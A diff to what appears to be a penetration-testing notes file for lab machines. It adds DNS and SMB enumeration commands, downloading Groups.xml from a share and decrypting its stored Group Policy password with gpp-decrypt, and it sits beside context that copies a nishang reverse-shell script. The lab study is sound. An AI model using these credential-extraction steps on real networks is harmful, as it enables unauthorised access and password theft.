@@ -5,6 +5,9 @@ WEB
 ENUMERATION
 gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
+DNS
+dnsrecon -d 10.10.10.100 -r 10.0.0.0/8
+
 WINDOWS
 
 
@@ -14,6 +17,14 @@ https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/
 
 SMB
 smbmap -u USER -p PASSWORD -d DOMAIN -H ip
+# recursively list share contents
+smbmap -R dirname -H ip
+# download file with certain name
+smbmap -R dirname -H ip -A Groups.xml
+# decrypt gpp password, cpassword comes from group xml
+gpp-decrypt "cpassword"
+
+smbclient -L //10.10.10.100   (enter if password is requested)
 
 SHELLS
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
@@ -42,6 +53,7 @@ USEFULL FRAMEWORKS
 GIT
 nishang --> https://github.com/samratashok/nishang.git
 JAWS  --> enumeration https://github.com/411Hall/JAWS.git
+impacket --> https://github.com/SecureAuthCorp/impacket.git
 APT
 gobuster
 mdbtools
